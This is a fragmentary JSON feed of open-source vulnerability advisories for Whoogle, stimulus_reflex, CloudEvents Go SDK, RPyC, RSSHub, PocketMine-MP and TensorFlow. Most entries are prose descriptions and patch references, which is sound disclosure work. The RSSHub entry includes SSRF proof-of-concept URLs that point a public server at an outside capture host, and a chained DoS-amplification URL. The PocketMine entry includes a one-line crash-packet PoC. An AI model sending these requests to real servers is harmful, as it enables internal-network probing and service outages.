            "details": "<b>Whoogle Search Server-Side Request Forgery vulnerability</b><br>Whoogle Search is a self-hosted metasearch engine. In versions 0.8.3 and prior, the `window` endpoint does not sanitize user-supplied input from the `location` variable and passes it to the `send` method which sends a `GET` request on lines 339-343 in `request.py,` which leads to a server-side request forgery. This issue allows for crafting GET requests to internal and external resources on behalf of the server. For example, this issue would allow for accessing resources on the internal network that the server has access to, even though these resources may not be accessible on the internet. This issue is fixed in version 0.8.4.\n\n",

            "details": "<b>Whoogle Search Path Traversal vulnerability</b><br>Whoogle Search is a self-hosted metasearch engine. In versions prior to 0.8.4, the `element` method in `app&#x2F;routes.py` does not validate the user-controlled `src_type` and `element_url` variables and passes them to the `send` method which sends a GET request on lines 339-343 in `request.py`, which leads to a server-side request forgery. This issue allows for crafting GET requests to internal and external resources on behalf of the server. For example, this issue would allow for accessing resources on the internal network that the server has access to, even though these resources may not be accessible on the internet. This issue is fixed in version 0.8.4.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-phg6-44m7-hx3h' target='_blank'>GHSA-phg6-44m7-hx3h</a>",
            "details": "<b>Whoogle Search Cross-site Scripting vulnerability</b><br>Whoogle Search is a self-hosted metasearch engine. In versions 0.8.3 and prior, the `element` method in `app&#x2F;routes.py` does not validate the user-controlled `src_type` and `element_url` variables and passes them to the `send` method which sends a `GET` request on lines 339-343 in `requests.py`. The returned contents of the URL are then passed to and reflected back to the user in the `send_file` function on line 484, together with the user-controlled `src_type`, which allows the attacker to control the HTTP response content type leading to a cross-site scripting vulnerability. An attacker could craft a special URL to point to a malicious website and send the link to a victim. The fact that the link would contain a trusted domain (e.g. from one of public Whoogle instances) could be used to trick the user into clicking the link.The malicious website could, for example, be a copy of a real website, meant to steal a person\u2019s credentials to the website, or trick that person in another way. Version 0.8.4 contains a patch for this issue.",

            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-hh2q-qv66-jcqg' target='_blank'>GHSA-hh2q-qv66-jcqg</a>",
            "details": "<b>Whoogle Search Path Traversal vulnerability</b><br>Whoogle Search is a self-hosted metasearch engine. Versions 0.8.3 and prior have a limited file write vulnerability when the configuration options in Whoogle are enabled. The `config` function in `app&#x2F;routes.py` does not validate the user-controlled `name` variable on line 447 and `config_data` variable on line 437. The `name` variable is insecurely concatenated in `os.path.join`, leading to path manipulation. The POST data from the `config_data` variable is saved with `pickle.dump` which leads to a limited file write. However, the data that is saved is earlier transformed into a dictionary and the `url` key value pair is added before the file is saved on the system. All in all, the issue allows us to save and overwrite files on the system that the application has permissions to, with a dictionary containing arbitrary data and the `url` key value, which is a limited file write. Version 0.8.4 contains a patch for this issue.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-28121' target='_blank'>CVE-2024-28121</a>",
            "details": "<b></b><br>stimulus_reflex is a system to extend the capabilities of both Rails and Stimulus by intercepting user interactions and passing them to Rails over real-time websockets. In affected versions more methods than expected can be called on reflex instances. Being able to call some of them has security implications. To invoke a reflex a websocket message of the following shape is sent: `\\&quot;target\\&quot;:\\&quot;[class_name]#[method_name]\\&quot;,\\&quot;args\\&quot;:[]`. The server will proceed to instantiate `reflex` using the provided `class_name` as long as it extends `StimulusReflex::Reflex`. It then attempts to call `method_name` on the instance with the provided arguments. This is problematic as `reflex.method method_name` can be more methods that those explicitly specified by the developer in their reflex class. A good example is the instance_variable_set method. This vulnerability has been patched in versions 3.4.2 and 3.5.0.rc4. Users unable to upgrade should: see the backing GHSA advisory for mitigation advice.",

            "details": "<b>Authentication token leak in github.com&#x2F;cloudevents&#x2F;sdk-go&#x2F;v2</b><br>Using cloudevents.WithRoundTripper to create a cloudevents.Client with an authenticated http.RoundTripper causes the go-sdk to leak credentials to arbitrary endpoints. When the transport is populated with an authenticated transport, http.DefaultClient is modified with the authenticated transport and will start to send Authorization tokens to any endpoint it is used to contact.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-28110' target='_blank'>CVE-2024-28110</a>",
            "details": "<b></b><br>Go SDK for CloudEvents is the official CloudEvents SDK to integrate applications with CloudEvents. Prior to version 2.15.2, using cloudevents.WithRoundTripper to create a cloudevents.Client with an authenticated http.RoundTripper causes the go-sdk to leak credentials to arbitrary endpoints. When the transport is populated with an authenticated transport, then http.DefaultClient is modified with the authenticated transport and will start to send Authorization tokens to any endpoint it is used to contact. Version 2.15.2 patches this issue.",
            "published": "2024-03-06T22:15:57Z",
            "severity": "0",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/cloudevents/sdk-go/blob/67e389964131d55d65cd14b4eb32d57a47312695/v2/protocol/http/protocol.go#L104-L110'>https://github.com/cloudevents/sdk-go/blob/67e389964131d55d65cd14b4eb32d57a47312695/v2/protocol/http/protocol.go#L104-L110</a></li></ul>"
        }, {
            "ecosystem": "Go",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-5pf6-2qwx-pxm2' target='_blank'>GHSA-5pf6-2qwx-pxm2</a>",
            "details": "<b>Go SDK for CloudEvents&#x27;s use of WithRoundTripper to create a Client leaks credentials</b><br>### Impact\n_What kind of vulnerability is it? Who is impacted?_\nUsing cloudevents.WithRoundTripper to create a cloudevents.Client with an authenticated http.RoundTripper causes the go-sdk to leak credentials to arbitrary endpoints.\n\nThe relevant code is [here](https:&#x2F;&#x2F;github.com&#x2F;cloudevents&#x2F;sdk-go&#x2F;blob&#x2F;67e389964131d55d65cd14b4eb32d57a47312695&#x2F;v2&#x2F;protocol&#x2F;http&#x2F;protocol.go#L104-L110) (also inline, emphasis added):\n\n&amp;lt;pre&amp;gt;if p.Client == nil {\n  p.Client = **http.DefaultClient**\n}\n\nif p.roundTripper != nil {\n  p.Client.**Transport = p.roundTripper**\n}\n&amp;lt;&#x2F;pre&amp;gt;\n\nWhen the transport is populated with an authenticated transport such as:\n- [oauth2.Transport](https:&#x2F;&#x2F;pkg.go.dev&#x2F;golang.org&#x2F;x&#x2F;oauth2#Transport)\n- [idtoken.NewClient(...).Transport](https:&#x2F;&#x2F;pkg.go.dev&#x2F;google.golang.org&#x2F;api&#x2F;idtoken#NewClient)\n\n... then http.DefaultClient is modified with the authenticated transport and will start to send Authorization tokens to\n**any endpoint** it is used to contact!\n\nFound and patched by: @tcnghia and @mattmoor\n\n### Patches\nv.2.15.2\n",
            "published": "2024-03-06T20:11:59Z",
            "severity": "0",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/cloudevents/sdk-go/security/advisories/GHSA-5pf6-2qwx-pxm2'>https://github.com/cloudevents/sdk-go/security/advisories/GHSA-5pf6-2qwx-pxm2</a></li><li>- <a target='_blank' href='https://github.com/cloudevents/sdk-go/commit/de2f28370b0d2a0f64f92c0c6139fa4b8a7c3851'>https://github.com/cloudevents/sdk-go/commit/de2f28370b0d2a0f64f92c0c6139fa4b8a7c3851</a></li><li>- <a target='_blank' href='https://github.com/cloudevents/sdk-go'>https://github.com/cloudevents/sdk-go</a></li><li>- <a target='_blank' href='https://github.com/cloudevents/sdk-go/blob/67e389964131d55d65cd14b4eb32d57a47312695/v2/protocol/http/protocol.go#L104-L110'>https://github.com/cloudevents/sdk-go/blob/67e389964131d55d65cd14b4eb32d57a47312695/v2/protocol/http/protocol.go#L104-L110</a></li></ul>"

            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-h5cg-53g7-gqjw' target='_blank'>GHSA-h5cg-53g7-gqjw</a>",
            "details": "<b>RPyC&#x27;s missing security check results in code execution when using numpy.array on the server-side.</b><br>An issue in Open Source: RPyC v.4.00 thru v.5.3.1 allows a remote attacker to execute arbitrary code via a crafted script to the `__array__` attribute component. This vulnerability was introduced in [9f45f826](https:&#x2F;&#x2F;github.com&#x2F;tomerfiliba-org&#x2F;rpyc&#x2F;commit&#x2F;9f45f8269d4106905db61d82cd529cacdb178911).\n\n### Attack Vector\nRPyC services that rely on the `__array__` attribute used by numpy are impacted. When the server-side exposes a method that calls the attribute named `__array__` for a a client provided netref (e.g., `np.array(client_netref)`), a remote attacker can craft a class which results in remote code execution\n\n### Impact\nAssuming the system exposes a method that calls the attribute `__array__`, an attacker can execute code using the vulnerable component. \n\n### Patches\nThe fix is available in RPyC 6.0.0. The major version change is because some users may need to set `allow_pickle` to `True` when migrating to RPyC 6.\n\n### Workarounds\nWhile the recommend fix is to upgrade to RPyC 6.0.0, the workaround is to [apply bba1d356 as patch.](https:&#x2F;&#x2F;github.com&#x2F;tomerfiliba-org&#x2F;rpyc&#x2F;commit&#x2F;bba1d3562e6f9f1256ec64048cc23001c0bb7516)\n\n### Affected Component\n[The affected component](https:&#x2F;&#x2F;github.com&#x2F;tomerfiliba-org&#x2F;rpyc&#x2F;blob&#x2F;5.3.1&#x2F;rpyc&#x2F;core&#x2F;netref.py#L252-L255) is the `__array__` method constructed for `NetrefClass`.\n\n### References\n- [Original disclosure](https:&#x2F;&#x2F;gist.github.com&#x2F;renbou&#x2F;957f70d27470982994f12a1d70153d09) by [renbou (Artem Mikheev)](https:&#x2F;&#x2F;gist.github.com&#x2F;renbou)\n- [CVE-2024-27758](https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2024-27758)\n",
            "published": "2024-03-06T17:05:30Z",

            "details": "<b>RSSHub vulnerable to Server-Side Request Forgery</b><br>### Summary\n\nServeral Server-Side Request Forgery (SSRF) vulnerabilities in RSSHub allow remote attackers to use the server as a proxy to send HTTP GET requests to arbitrary targets and retrieve information in the internal network or conduct Denial-of-Service (DoS) attacks.\n\n### Details\n\n#### `&#x2F;mastodon&#x2F;acct&#x2F;:acct&#x2F;statuses&#x2F;:only_media?`\n\nhttps:&#x2F;&#x2F;github.com&#x2F;DIYgod&#x2F;RSSHub&#x2F;blob&#x2F;5928c5db2472e101c2f5c3bafed77a2f72edd40a&#x2F;lib&#x2F;routes&#x2F;mastodon&#x2F;acct.js#L4-L7\n\nhttps:&#x2F;&#x2F;github.com&#x2F;DIYgod&#x2F;RSSHub&#x2F;blob&#x2F;5928c5db2472e101c2f5c3bafed77a2f72edd40a&#x2F;lib&#x2F;routes&#x2F;mastodon&#x2F;utils.js#L85-L105\n\n#### `&#x2F;zjol&#x2F;paper&#x2F;:id?`\n\nhttps:&#x2F;&#x2F;github.com&#x2F;DIYgod&#x2F;RSSHub&#x2F;blob&#x2F;172f6cfd2b69ea6affdbdedf61e6dde1671f3796&#x2F;lib&#x2F;routes&#x2F;zjol&#x2F;paper.js#L7-L13\n\n#### `&#x2F;m4&#x2F;:id?&#x2F;:category*`\n\nhttps:&#x2F;&#x2F;github.com&#x2F;DIYgod&#x2F;RSSHub&#x2F;blob&#x2F;172f6cfd2b69ea6affdbdedf61e6dde1671f3796&#x2F;lib&#x2F;routes&#x2F;m4&#x2F;index.js#L10-L14\n\n### PoC\n\n- https:&#x2F;&#x2F;rsshub.app&#x2F;mastodon&#x2F;acct&#x2F;test@a6wt15r2.requestrepo.com%23&#x2F;statuses\n- https:&#x2F;&#x2F;rsshub.app&#x2F;zjol&#x2F;paper&#x2F;a6wt15r2.requestrepo.com%23\n- https:&#x2F;&#x2F;rsshub.app&#x2F;m4&#x2F;a6wt15r2.requestrepo.com%23&#x2F;test\n\n### Impact\n\nThe attacker can send malicious requests to a RSSHub server, to make the server send HTTP GET requests to arbitrary destinations and see partial responses. This may lead to:\n\n1. Leak the server IP address, which could be hidden behind a CDN.\n2. Retrieve information in the internal network. e.g. which addresses&#x2F;ports are accessible, the titles and meta descriptions of HTML pages.\n3. DoS amplification. The attacker could request the server to download some large files, or chain several SSRF requests in a single attacker request: `https:&#x2F;&#x2F;rsshub.a.com&#x2F;zjol&#x2F;paper&#x2F;rsshub.b.net%2Fzjol%2Fpaper%2Frsshub.a.com%252Fzjol%252Fpaper%252Frsshub.b.net%25252Fzjol%25252Fpaper%25252Frsshub.a.com%2525252Fzjol%2525252Fpaper%2525252Fexample.com%2525252523%25252523%252523%2523%23`.\n",

            "details": "<b>PocketMine-MP BookEditPacket crash when inventory slot in the packet is invalid</b><br>### Summary\nIf a client sends a BookEditPacket with InventorySlot greater than 35, the server will crash due to an unhandled exception thrown by `BaseInventory-&amp;gt;getItem()`.\n\n### Details\nCrashes at https:&#x2F;&#x2F;github.com&#x2F;pmmp&#x2F;PocketMine-MP&#x2F;blob&#x2F;b744e09352a714d89220719ab6948a010ac636fc&#x2F;src&#x2F;network&#x2F;mcpe&#x2F;handler&#x2F;InGamePacketHandler.php#L873\n\n### PoC\nUsing Gophertunnel, use `serverConn.WritePacket(&amp;packet.BookEdit{InventorySlot: 36})`\n\n### Impact\nServer crash, all servers\n\n### Patched versions\nThis issue was fixed by 47f011966092f275cc1b11f8de635e89fd9651a7, and the fix was released in 5.11.2.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-21725' target='_blank'>BIT-tensorflow-2022-21725</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The estimator for the cost of some convolution operations can be made to execute a division by 0. The function fails to check that the stride argument is strictly positive. Hence, the fix is to add a check for the stride argument to ensure it is valid. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/ffa202a17ab7a4a10182b746d230ea66f021fe16/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L189-L198'>https://github.com/tensorflow/tensorflow/blob/ffa202a17ab7a4a10182b746d230ea66f021fe16/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L189-L198</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a'>https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v3f7-j968-4h5f'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v3f7-j968-4h5f</a></li></ul>"

            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-21726' target='_blank'>BIT-tensorflow-2022-21726</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of `Dequantize` does not fully validate the value of `axis` and can result in heap OOB accesses. The `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:15:52.385Z",
            "severity": "0",
            "langs": "cc",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153'>https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943'>https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-23hm-7w47-xw72'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-23hm-7w47-xw72</a></li></ul>"
        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-21727' target='_blank'>BIT-tensorflow-2022-21727</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of shape inference for `Dequantize` is vulnerable to an integer overflow weakness. The `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

        }, {

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-21728' target='_blank'>BIT-tensorflow-2022-21728</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of shape inference for `ReverseSequence` does not fully validate the value of `batch_dim` and can result in a heap OOB read. There is a check to make sure the value of `batch_dim` does not go over the rank of the input, but there is no check for negative values. Negative dimensions are allowed in some cases to mimic Python&#x27;s negative indexing (i.e., indexing from the end of the array), however if the value is too negative then the implementation of `Dim` would access elements before the start of an array. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of shape inference for `ConcatV2` can be used to trigger a denial of service attack via a segfault caused by a type confusion. The `axis` argument is translated into `concat_dim` in the `ConcatShapeHelper` helper function. Then, a value for `min_rank` is computed based on `concat_dim`. This is then used to validate that the `values` tensor has at least the required rank. However, `WithRankAtLeast` receives the lower bound as a 64-bits value and then compares it against the maximum 32-bits integer value that could be represented. Due to the fact that `min_rank` is a 32-bits value and the value of `axis`, the `rank` argument is a negative value, so the error check is bypassed. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23560' target='_blank'>BIT-tensorflow-2022-23560</a>",

        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23566' target='_blank'>BIT-tensorflow-2022-23566</a>",

        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23570' target='_blank'>BIT-tensorflow-2022-23570</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. When decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is guarded by a `DCHECK`. However, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:15:15.176Z",
            "severity": "0",
            "langs": "cc",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c'>https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9p77-mmrw-69c7'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9p77-mmrw-69c7</a></li></ul>"
        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23572' target='_blank'>BIT-tensorflow-2022-23572</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. Under certain scenarios, TensorFlow can fail to specialize a type during shape inference. This case is covered by the `DCHECK` function however, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the `ValueOrDie` line. This results in an assertion failure as `ret` contains an error `Status`, not a value. In the second case we also get a crash due to the assertion failure. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:15:12.721Z",
            "severity": "0",
            "langs": "cc",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L168-L174'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L168-L174</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b'>https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rww7-2gpw-fv6j'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rww7-2gpw-fv6j</a></li></ul>"
        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23573' target='_blank'>BIT-tensorflow-2022-23573</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of `AssignOp` can result in copying uninitialized data to a new tensor. This later results in undefined behavior. The implementation has a check that the left hand side of the assignment is initialized (to minimize number of allocations), but does not check that the right hand side is also initialized. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:15:11.459Z",
            "severity": "0",
            "langs": "h",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/assign_op.h#L30-L143'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/assign_op.h#L30-L143</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/ef1d027be116f25e25bb94a60da491c2cf55bd0b'>https://github.com/tensorflow/tensorflow/commit/ef1d027be116f25e25bb94a60da491c2cf55bd0b</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q85f-69q7-55h2'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q85f-69q7-55h2</a></li></ul>"
        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23574' target='_blank'>BIT-tensorflow-2022-23574</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. There is a typo in TensorFlow&#x27;s `SpecializeType` which results in heap OOB read&#x2F;write. Due to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments. Since this is a mutable proto value, it allows both read and write to outside of bounds data. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:15:10.191Z",

        }, {

        }, {

            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The implementation of `OpLevelCostEstimator::CalculateOutputSize` is vulnerable to an integer overflow if an attacker can create an operation which would involve tensors with large enough number of elements. We can have a large enough number of dimensions in `output_shape.dim()` or just a small number of dimensions being large enough to cause an overflow in the multiplication. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1598-L1617'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1598-L1617</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae'>https://github.com/tensorflow/tensorflow/commit/b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wm93-f238-7v37'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wm93-f238-7v37</a></li></ul>"
        }, {

            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. If a graph node is invalid, TensorFlow can leak memory in the implementation of `ImmutableExecutorState::Initialize`. Here, we set `item-&amp;gt;kernel` to `nullptr` but it is a simple `OpKernel*` pointer so the memory that was previously allocated to it would leak. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23582' target='_blank'>BIT-tensorflow-2022-23582</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. A malicious user can cause a denial of service by altering a `SavedModel` such that `TensorByteSize` would trigger `CHECK` failures. `TensorShape` constructor throws a `CHECK`-fail if shape is partial or has a number of elements that would overflow the size of an `int`. The `PartialTensorShape` constructor instead does not cause a `CHECK`-abort if the shape is partial, which is exactly what this function needs to be able to return `-1`. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23583' target='_blank'>BIT-tensorflow-2022-23583</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. A malicious user can cause a denial of service by altering a `SavedModel` such that any binary op would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved. If `Tin` and `Tout` don&#x27;t match the type of data in `out` and `input_*` tensors then `flat&amp;lt;*&amp;gt;` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:14:57.715Z",

            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. A malicious user can cause a use after free behavior when decoding PNG images. After `png::CommonFreeDecode(&amp;decode)` gets called, the values of `decode.width` and `decode.height` are in an unspecified state. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23585' target='_blank'>BIT-tensorflow-2022-23585</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. When decoding PNG images TensorFlow can produce a memory leak if the image is invalid. After calling `png::CommonInitDecode(..., &amp;decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(&amp;decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23588' target='_blank'>BIT-tensorflow-2022-23588</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. A malicious user can cause a denial of service by altering a `SavedModel` such that Grappler optimizer would attempt to build a tensor using a reference `dtype`. This would result in a crash due to a `CHECK`-fail in the `Tensor` constructor as reference types are not allowed. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",
            "published": "2024-03-06T11:14:51.406Z",

            "langs": "cc",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/tensor.cc#L733-L781'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/tensor.cc#L733-L781</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1328-L1402'>https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1328-L1402</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/commit/6b5adc0877de832b2a7c189532dbbbc64622eeb6'>https://github.com/tensorflow/tensorflow/commit/6b5adc0877de832b2a7c189532dbbbc64622eeb6</a></li><li>- <a target='_blank' href='https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fx5c-h9f6-rv7c'>https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fx5c-h9f6-rv7c</a></li></ul>"
        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23589' target='_blank'>BIT-tensorflow-2022-23589</a>",
